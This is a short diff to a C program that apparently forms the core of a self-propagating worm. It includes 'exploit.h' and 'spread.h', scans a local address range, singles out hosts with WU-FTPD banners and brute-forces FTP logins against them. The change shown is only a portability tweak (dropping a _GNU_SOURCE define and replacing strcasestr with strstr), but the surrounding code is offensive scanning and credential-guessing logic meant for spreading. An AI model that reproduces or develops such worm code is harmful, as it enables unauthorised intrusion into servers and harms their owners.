@@ -7,8 +7,6 @@
 #include "exploit.h"
 #include "spread.h"
 
-#define _GNU_SOURCE
-
 #ifndef ADDRESS_RANGE
 #  define ADDRESS_RANGE       "192.168.0.0-255"
 #endif
@@ -39,7 +37,7 @@ int main(int argc, const char *argv[]) {
   target_table = scanner(ADDRESS_RANGE, PORT_RANGE, INTERFACE, USE_RAW_SOCKET, 1);
   if(target_table != NULL) {
     for(target = target_table; target != NULL; target = target->next) {
-      if(strcasestr(target->banner, "WUFTPD") != NULL) {
+      if(strstr(target->banner, "WUFTPD") != NULL) {
         if((method = rand() % 2) == 0) {
           while(bruteforce(guess, sizeof guess) != 0) {
             if((fd = ftp_login(target->address, target->port, FTP_USER, guess)) > 0) {
